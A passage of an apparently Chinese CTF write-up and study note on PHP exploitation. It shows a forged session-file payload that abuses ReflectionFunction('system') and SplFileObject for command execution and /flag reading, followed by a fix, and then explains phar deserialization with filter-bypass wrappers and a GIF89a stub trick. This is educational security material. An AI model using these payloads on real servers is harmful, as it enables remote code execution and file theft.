    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filepath</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'content'</span>]);</code></pre>
<p>通过分析可以发现我们上传的文件存在目录穿越的问题，我们能通过<code>filename=../xxxx</code>这种方式将文件保存的路径穿越到服务器的任意路径下，但是由于存在对文件名h字符的过滤，因此无法直接传一个php文件到网站根目录下执行，得另寻僻径。</p>
<p><strong>.user.ini（无果）</strong></p>
<p>既然过滤掉了h字符，意味着<code>.htaccess</code>这样的修改配置文件意味着行不通，但是我想起了另外一个修改配置的文件<code>.user.ini</code>。<code>.user.ini</code>和<code>.htaccess</code>一样是对当前目录的所以<code>php</code>文件的配置设置，即写了<code>.user.ini</code>和它同目录的文件会优先使用<code>.user.ini</code>中设置的配置属性。</p>
<p>但是不是<code>php.ini</code>中的每个变量都能通过<code>ini_set()</code>或者<code>.user.ini</code>和<code>.htaccess</code>来设置，简单的来说每个变量有它所属于的模式，下面官方手册的四个模式</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625220942835.png" alt="image-20230625220942835"></p>
<p>通过上表，看到<code>PHP_INI_USER</code>模式中提到，可以在<code>.user.ini</code>中设定。<strong>但实际上，只要不是<code>PHP_INI_SYSTEM</code>模式下的属性，均可以在<code>.user.ini</code>中设置。</strong></p>
<p>那配置文件应该怎么写呢，这里有官方的配置选项列表：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ini.list.php">php.ini 配置选项列表</a></p>
<p>在文件上传的题目中，我们只需记住这两个选项即可：</p>
<pre><code class="hljs php">auto_prepend_file = xxx        <span class="hljs-comment">// 在每个文件头添加上指定文件的内容，相当于include(xxx)</span>
user_ini.cache_ttl = xx        <span class="hljs-comment">// 设置配置的生效时间，默认300秒</span></code></pre>
<p>于是我们就想是否能够通过上传一个一句话木马文件，然后再目录穿越将<code>.user.ini</code>上传到网站根目录下，内容是让其他文件都包含这个一句话木马，从而实现getshell，但是尝试了很多次都无果，由此猜测运行的模式是<code>PHP_INI_SYSTEM</code>导致了<code>.user.ini</code>无法生效。</p>
<p><strong>SplFileObject类读文件</strong></p>
<p>比赛的时候做到这里其实已经没思路了（还是题目刷得少啊），赛后看有通过<strong>SplFileObject 类</strong>来读文件得思路，那先得了解一下<strong>SplFileObject 类</strong>是个什么玩意。</p>
<p>SplFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等。详情请参考：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.splfileobject.php">https://www.php.net/manual/zh/class.splfileobject.php</a></p>
<p>该类的构造方法可以构造一个新的文件对象用于后续的读取。</p>
<p>我们可以像类似下面这样去读取一个文件的一行：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">'/etc/passwd'</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$context</span>;        <span class="hljs-comment">// 输出 root:x:0:0:root:/root:/bin/bash</span></code></pre>
<p>但是这样也只能读取一行，要想全部读取的话还需要对文件中的每一行内容进行遍历：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">'/etc/passwd'</span>);
<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$context</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>){
    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>);
}</code></pre>
<p><strong>session反序列化</strong></p>
<p>那么我们知道了这个类之后有什么用呢，似乎找不到可以用的地方啊，想想文件中是不是还有一个文件我们都没用上，其中必然藏有解题的关键。</p>
<pre><code class="hljs php">    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'files'</span>][<span class="hljs-variable">$filename</span>] = <span class="hljs-variable">$filepath</span>;      <span class="hljs-comment">// 将带有路径的文件名字作为键，文件路径作为值</span>
    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'paths'</span>][<span class="hljs-variable">$filepath</span>] = <span class="hljs-string">'file'</span>;         <span class="hljs-comment">// 将文件目录作为键，'file'作为值</span>
    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">'Location:/?file='</span>.<span class="hljs-variable">$filename</span>);
}</code></pre>
<p>这里把文件的名字和路径都存到了SESSION里面，但是我们能够看到<code>$_SESSION['paths'][$filepath]</code>的值是被写死了，我们无法控制，然后接着往下看</p>
<pre><code class="hljs php"><span class="hljs-variable">$filelist</span> = <span class="hljs-keyword">array</span>();
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'paths'</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$path</span>=&gt;<span class="hljs-variable">$class</span>){          <span class="hljs-comment">// 将每一个文件的路径赋值给$path,将'file'赋值给$class</span>
    <span class="hljs-variable">$temp</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$class</span>(<span class="hljs-variable">$path</span>);          <span class="hljs-comment">// 相当于new file(文件的路径)</span>
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$class</span>==<span class="hljs-string">'file'</span>){             <span class="hljs-comment">// 存在$class不等于file的情况吗？？？？</span>
        <span class="hljs-variable">$filelist</span>[] = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$temp</span>;    <span class="hljs-comment">//将返回的文件名赋值给列表</span>
    }
    <span class="hljs-keyword">else</span>{
        <span class="hljs-variable">$filelist</span>[] = <span class="hljs-variable">$temp</span>;
    }
}
<span class="hljs-variable">$out</span> = <span class="hljs-string">'&lt;p&gt;your file:'</span>;
 
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$filelist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>){
    <span class="hljs-variable">$out</span> .= <span class="hljs-variable">$value</span>.<span class="hljs-string">' '</span>;         <span class="hljs-comment">//从列表中读取输出文件名</span>
}
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$out</span>.<span class="hljs-string">'&lt;/p&gt;'</span>;</code></pre>
<p>我们可以看到，这里从<code>$_SESSION['paths']</code>数组里面把每一个键（文件的路径）赋值给<code>$path</code>,将值<code>'file'</code>赋值给<code>$class</code>，然后重点就来了，这里用动态调用的方法新建了一个类对象，看到这里是不是觉得很奇怪，在上一段代码中，已经把每一个<code>$_SESSION['paths']</code>的值已经写死了为<code>'file'</code>了，为什么这里要动态调用而不是直接<code>new file($path)</code>这种更直接的方式呢，这里很明显有问题。接着往下看，这里又用<code>if()</code>来判断<code>$class</code>的值是否是<code>'file'</code>，这就更加明显了了，<code>$class</code>的值必然又猫腻，看回代码，最后是将新建的类对象赋值给一个临时变量，然后再通过循环输出每一个值，看到这里是不是有点熟悉，这不就是<code>SplFileObject类</code>需要循环来输出每一行的值吗？于是这里几乎能肯定是通过将<code>$class</code>的值变成<code>SplFileObject</code>，来获取文件的内容。</p>
<p>既然是读取SESSION的内容，那我是否能够改变SESSION的内容呢？结合我们目录穿越的漏洞，实际上如果我们知道SESSION保存的路径和SESSION序列化的方法，那么我们实际上可以直接上传一个SESSION文件到指定的目录中，控制SESSION的内容，所以最后一个info.php文件就是让我们看SESSION保存的路径和序列化方法的。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230626152616582.png" alt="image-20230626152616582"></p>
<p>接着就是构造我们的SESSION序列化后的文件</p>
<pre><code class="hljs plaintext">paths|a:1:{s:5:"/flag";s:13:"SplFileObject";}</code></pre>
<p>这里的键为<code>/flag</code>对应代码中的<code>$path</code>，值为<code>SplFileObject</code>对应<code>$class</code>，组合起来就是<code>SplFileObject('/flag')</code>。然后文件名需要目录穿越到<code>/tmp/sess_[SSID的值]</code></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230626152907795.png" alt="image-20230626152907795"></p>
<p>func是一个变量，并未赋值，files变量有一个数组，其中键值filename对应./files/filename，后面的paths同理</p>
<p>这里懵逼了半天，我以为作者想靠PHP序列化引擎反序列化输入的content，弄半天只是将内容插入session文件中，这样由于他是php序列化引擎，将|看做键值分隔符，这样就path做为key，后面是值，那这一切就说通了…，与我所见不同的是，他这已经是目录穿越进入到session文件中了，因此他post写的内容就直接插入session文件，并不会被序列化处理（嗯，大概是这样吧）</p>
<p><strong>ReflectionFunction反射类</strong></p>
<p>这里是另外一个能利用的类，这个类能够直接写shell，比上面的只能读文件更加牛逼。这也应该是预期解，题目中所有的代码都用上了。</p>
<p>网上能够搜出来CTF中的用法是：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-variable">$func</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionFunction</span>(<span class="hljs-variable">$_GET</span>[m]);
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$func</span>-&gt;<span class="hljs-title function_ invoke__">invokeArgs</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$_GET</span>[c]));
<span class="hljs-meta">?&gt;</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230626165826427.png" alt="image-20230626165826427"></p>
<p>那这道题里面该怎么用这个类呢，由于要用到这个类里面的<code>invokeArgs()</code>这方法，因此要用到数组去动态调用类里面的方法。</p>
<p>example：</p>
<pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"hello "</span>.<span class="hljs-variable">$name</span>;
    }
}
<span class="hljs-variable">$t</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0</span> =&gt; <span class="hljs-variable">$t</span>,<span class="hljs-number">1</span> =&gt; <span class="hljs-string">"hello"</span>);
<span class="hljs-variable">$a</span>(<span class="hljs-string">'john'</span>);            <span class="hljs-comment">// 输出hello john</span></code></pre>
<p>这里用数组的第一个位置的值是实例化后的类，第二个位置的值是类的方法名，因此我们要的是：</p>
<pre><code class="hljs php"><span class="hljs-variable">$function</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionFunction</span>(<span class="hljs-string">'system'</span>);
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0</span> =&gt; <span class="hljs-variable">$function</span>,<span class="hljs-number">1</span> =&gt; <span class="hljs-string">"invokeArgs"</span>);
<span class="hljs-variable">$b</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0</span> =&gt; <span class="hljs-string">'whoami'</span>);
<span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);</code></pre>
<p>先实例化<code>ReflectionFunction</code>类对象，然后再构造出这两个数组，最后找到一个能够动态调用的地方。</p>
<p>再看回题目，我们在之前的分析中已经能实现能够实例化自己想要的类了。</p>
<pre><code class="hljs php">paths|a:<span class="hljs-number">1</span>:{s::<span class="hljs-string">"system"</span>;s::<span class="hljs-string">"ReflectionFunction"</span>;}</code></pre>
<p>那怎么构造出第一个数组呢，再看回这段代码：</p>
<pre><code class="hljs php"><span class="hljs-variable">$filelist</span> = <span class="hljs-keyword">array</span>();
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'paths'</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$path</span>=&gt;<span class="hljs-variable">$class</span>){          <span class="hljs-comment">// 将每一个文件的路径赋值给$path,将'file'赋值给$class</span>
    <span class="hljs-variable">$temp</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$class</span>(<span class="hljs-variable">$path</span>);          <span class="hljs-comment">// 相当于new file(文件的路径)</span>
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$class</span>==<span class="hljs-string">'file'</span>){             <span class="hljs-comment">// 存在$class不等于file的情况吗？？？？</span>
        <span class="hljs-variable">$filelist</span>[] = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$temp</span>;    <span class="hljs-comment">//将返回的文件名赋值给列表</span>
    }
    <span class="hljs-keyword">else</span>{
        <span class="hljs-variable">$filelist</span>[] = <span class="hljs-variable">$temp</span>;
    }
}</code></pre>
<p>这里已经为我们准备好了一个<code>$filelist</code>数组，在构造<code>ReflectionFunction</code>类对象的时候由于<code>$class</code>不等于字符串<code>'file'</code>，因此是直接放进了数组中，然后数组第二位我们需要是<code>'invokeArgs'</code>这个字符串，因此我们可以让<code>$class='file'</code>同时让<code>$path='invokeArgs'</code>，这样就能够返回一串字符串添加进数组里面，从而完成第一个数组的构造！</p>
<pre><code class="hljs php">paths|a:<span class="hljs-number">2</span>:{s:<span class="hljs-number">6</span>:<span class="hljs-string">"system"</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">"ReflectionFunction"</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">"invokeArgs"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"file"</span>;}</code></pre>
<p>得到<code>$filelist = array(0 =&gt; $temp,1 =&gt; "invokeArgs");</code></p>
<p>接下来就是构造第二个数组，和动态调用类方法。</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>])){
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'files'</span>][<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>]])) {      <span class="hljs-comment">//GET方法读取文件名，从session的文件名字里面寻找</span>
        <span class="hljs-variable">$pathinfo</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>]=&gt;<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'files'</span>][<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>]]);
        <span class="hljs-comment">// 构造数组</span>
        ${<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'func'</span>]}(<span class="hljs-variable">$pathinfo</span>);    <span class="hljs-comment">// 动态调用！！</span>
    }
    <span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'no such file!'</span>;
    }
}</code></pre>
<p>可以看到<code>$pathinfo</code>这里为我们构造了一个数组，并且数组的键是从GET方法获取的，而值又是从SESSION中的<code>files</code>数组里面找的，因此我们同样能够控制。</p>
<pre><code class="hljs php">files|a:<span class="hljs-number">1</span>:{i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">"whoami"</span>;}</code></pre>
<p>当使用GET方法去传递<code>file=0</code>这个参数的时候就能够构造出<code>$pathinfo = array(0=&gt;'whoami')</code>。</p>
<p>最后是动态调用，这里同样是从SESSION中的<code>func</code>参数中获取值进行动态调用，因此我们只需构造<code>$_SESSION['func']='filelist'</code>即可</p>
<pre><code class="hljs php">func|s:<span class="hljs-number">8</span>:<span class="hljs-string">"filelist"</span></code></pre>
<p>综上所述，我们写进SESSION文件里面的内容是</p>
<pre><code class="hljs php">func|s:<span class="hljs-number">8</span>:<span class="hljs-string">"filelist"</span>;files|a:<span class="hljs-number">1</span>:{i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">"whoami"</span>;}paths|a:<span class="hljs-number">2</span>:{s:<span class="hljs-number">6</span>:<span class="hljs-string">"system"</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">"ReflectionFunction"</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">"invokeArgs"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"file"</span>;}</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230626172929666.png" alt="image-20230626172929666"></p>
<p>这样就能够getshell了。</p>
<p><strong>修复</strong></p>
<p>修就很简单了，既然是因为目录穿越导致能够控制SESSION的内容，那么修掉目录穿越的地方就好了：</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'content'</span>])){
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>], <span class="hljs-string">'h'</span>)){            
        <span class="hljs-keyword">die</span>(<span class="hljs-string">'no h!'</span>);
    }
    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>]);
    <span class="hljs-variable">$filepath</span> = <span class="hljs-string">'./files/'</span>.<span class="hljs-variable">$filename</span>;    <span class="hljs-comment">//去掉了post，导致不可控，也就不能穿越了  </span>
    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filepath</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'content'</span>]);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>参考：<a target="_blank" rel="noopener" href="https://johnfrod.top/%E5%AE%89%E5%85%A8/ctf-%E4%B8%AD-php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">https://johnfrod.top/安全/ctf-中-php原生类的利用/</a></p>
<h2 id="0x11-phar反序列化">0x11 Phar反序列化</h2>
<p><strong>ctfshow 276</strong></p>
<p>phar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data。当受影响的文件操<br>
作函数调用phar文件时，会自动反序列化meta-data内的内容。</p>
<h3 id="111-什么是phar文件">11.1 什么是phar文件</h3>
<p>在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，<br>
样式表等）捆绑到一个归档文件中来实现应用程序和库的分发<br>
php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，如<br>
(fopen(),copy(),file_exists()和filesize()。 phar://就是一种内置的流包装器。<br>
php中一些常见的流包装器如下：</p>
<pre><code class="hljs plaintext">file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流</code></pre>
<h3 id="112-phar文件的结构">11.2 phar文件的结构</h3>
<pre><code class="hljs plaintext">1.stub
格式为：xxx&lt;?php xxx; __HALT_COMPILER();?&gt;
前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，这部分的目的就是让 phar 扩展识别这是一个标准的 phar 文件

phar文件标志，必须包含&lt;?php __HALT_COMPILER(); ?&gt;,PHP结束标志?&gt;可以省略，但语句结束符;与stub的结尾之间不能超过两个空格。在生成phar之前应先添加stub.&lt;?php __HALT_COMPILER(); ?&gt;之前也可添加其他内容伪造成其他文件，比如GIF89a&lt;?php __HALT_COMPILER(); ?&gt;

manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。

content:这部分就是我们想要压缩在 phar 压缩包内部的文件

signature (可空):签名，放在末尾。</code></pre>
<p>manifest 存放phar归档信息.Manifest结构如下图 所有未使用的标志保留，供将来使用，并且不得用于存储自定义信息。使用每个文件的元数据功能来存储有关特定文件的自定义信息.</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230727170910134.png" alt="image-20230727170910134"></p>
<p>下面生成一个phar文件<br>
前提：开启php.ini中的 <strong>phar.readonly = off</strong></p>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>{
    }

    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">"phar.phar"</span>);
    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">"phar.phar"</span>); <span class="hljs-comment">//后缀名必须为phar</span>
    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();
    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="hljs-comment">//设置stub</span>
    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();
    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span>
    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>); <span class="hljs-comment">//添加要压缩的文件</span>
    <span class="hljs-comment">//签名自动计算</span>
    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();
<span class="hljs-meta">?&gt;</span></code></pre>
<h3 id="113-漏洞利用条件">11.3 漏洞利用条件</h3>
<ol>
<li>phar文件要能够上传到服务器端。</li>
<li>要有可用的魔术方法作为“跳板”。</li>
<li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li>
</ol>
<h3 id="114-受影响的函数">11.4 受影响的函数：</h3>
<p><a target="_blank" rel="noopener" href="https://blog.zsxsoft.com/post/38">https://blog.zsxsoft.com/post/38</a></p>
<p>php中的大部分与文件操作相关函数在通过phar协议获取数据时会将phar文件的meta-data部分反序列化</p>
<table>
<thead>
<tr>
<th style="text-align:left">受影响的函数列表</th>
<th style="text-align:left"></th>
<th style="text-align:left"></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">fileatime</td>
<td style="text-align:left">filectime</td>
<td style="text-align:left">file_exists</td>
<td>file_get_contents</td>
</tr>
<tr>
<td style="text-align:left">file_put_contents</td>
<td style="text-align:left">file</td>
<td style="text-align:left">filegroup</td>
<td>fopen</td>
</tr>
<tr>
<td style="text-align:left">fileinode</td>
<td style="text-align:left">filemtime</td>
<td style="text-align:left">fileowner</td>
<td>fikeperms</td>
</tr>
<tr>
<td style="text-align:left">is_dir</td>
<td style="text-align:left">is_executable</td>
<td style="text-align:left">is_file</td>
<td>is_link</td>
</tr>
<tr>
<td style="text-align:left">is_readable</td>
<td style="text-align:left">is_writable</td>
<td style="text-align:left">is_writeable</td>
<td>parse_ini_file</td>
</tr>
<tr>
<td style="text-align:left">copy</td>
<td style="text-align:left">unlink</td>
<td style="text-align:left">stat</td>
<td>readfile</td>
</tr>
</tbody>
</table>
<h3 id="115-绕过方式">11.5 绕过方式</h3>
<p>当环境限制了phar不能出现在前面的字符里。可以使用<code>compress.bzip2://</code>和<code>compress.zlib://</code>等绕过</p>
<pre><code class="hljs PHP">compress.bzip:<span class="hljs-comment">//phar:///test.phar/test.txt</span>
compress.bzip2:<span class="hljs-comment">//phar:///test.phar/test.txt</span>
compress.zlib:<span class="hljs-comment">//phar:///home/sx/test.phar/test.txt</span>
php:<span class="hljs-comment">//filter/resource=phar:///test.phar/test.txt</span></code></pre>
<p>当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。<br>
php://filter/read=convert.base64-encode/resource=phar://phar.phar<br>
GIF格式验证可以通过在文件头部添加GIF89a绕过<br>
1、$phar-&gt;setStub(“GIF89a”.“”); //设置stub<br>
2、生成一个phar.phar，修改后缀名为phar.g</p>
<p>实战参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6699#toc-4">https://xz.aliyun.com/t/6699#toc-4</a></p>
<h3 id="116-从-php-源码探索-phar-利用成功的深层原因">11.6 从 PHP 源码探索 phar 利用成功的深层原因</h3>
<h4 id="1-php-流的概念">1. PHP 流的概念</h4>
<p>流的作用是在出发地和目的地之间传输数据。出发地和目的地可以是文件、命令行进程、网络连接、ZIP 或 TAR 压缩文件、临时内存、标准输入或输出，或者是通过 <strong>PHP 流封装协议</strong>实现的任何其他资源。</p>
<p>如果你读写过文件，就用过流；如果你从 php://stdin 读取过数据，或者把输入写入 php://stdout，也用过流。流为 PHP 的很多 IO 函数提供了底层实现，如 file_get_contents、fopn、fread 和 fwrite 等。<strong>PHP 的流函数提供了不同资源的统一接口。</strong></p>
<p>我们可以把流比作管道，把水（资源数据）从一个地方引到另一个地方。在水从出发地到目的地的过程中，我们可以过滤水，可以改变水质，可以添加水，也可以排出水。</p>
<h4 id="2-流封装协议wrapper">2. 流封装协议（wrapper）</h4>
<p>因为流式数据的种类各异，而每种类型需要独特的协议，以便读写数据，我们称这些协议为流封装协议。例如，我们可以读写文件系统，可以通过 HTTP、HTTPS 或 SSH 与远程 Web 服务器通信，还可以打开并读写 ZIP、RAR 或 PHAR 压缩文件</p>
<p>虽然过程是一样的，但是读写文件系统中文件的方式与收发 HTTP 消息的方式有所不同，流封装协议的作用是使用通用的接口封装这种差异。</p>
<p>每个流都有一个协议和一个目标。指定协议和目标的方法是使用流标识符：<code>&lt;scheme&gt;://&lt;target&gt;</code>，其中 <code>&lt;scheme&gt;</code> 是流的封装协议，<code>&lt;target&gt;</code> 是流的数据源。</p>
<h5 id="21-http流封装协议">2.1 <a target="_blank" rel="noopener" href="http://xn--ykr35rr2oc4zqbd">http://流封装协议</a></h5>
<p>下面使用 HTTP 流封装协议创建了一个与 Flicker API 通信的 PHP 流：</p>
<pre><code class="hljs plaintext">&lt;?php
$json = file_get_contents(
    'http://api.flickr.com/services/feeds/photos_public.gne?format=json'
);</code></pre>
<p>不要以为这是普通的网页 URL，file_get_contents() 函数的字符串参数其实是一个流标识符。http 协议会让 PHP 使用 HTTP 流封装协议，在这个参数中，http 之后是流的目标。</p>
<blockquote>
<p>注：很多 PHP 开发者可能并不知道普通的 URL 其实是 PHP 流封装协议标识符的伪装。</p>
</blockquote>
<h5 id="22-file流封装协议">2.2 file://流封装协议</h5>
<p>我们通常使用 file_get_contents()、fopen()、fwrite() 和 fclose() 等函数读写文件系统，<strong>因为 PHP 默认使用的流封装协议是 file://</strong>，所以我们很少认为这些函数使用的是 PHP 流。下面的示例演示了使用 file:// 流封装协议创建一个读写 /etc/hosts 文件的流：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$handle</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">'file:///etc/hosts'</span>, <span class="hljs-string">'rb'</span>);
<span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$handle</span>) !== <span class="hljs-literal">TRUE</span>) {
        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$handle</span>);
}
<span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$handle</span>);</code></pre>
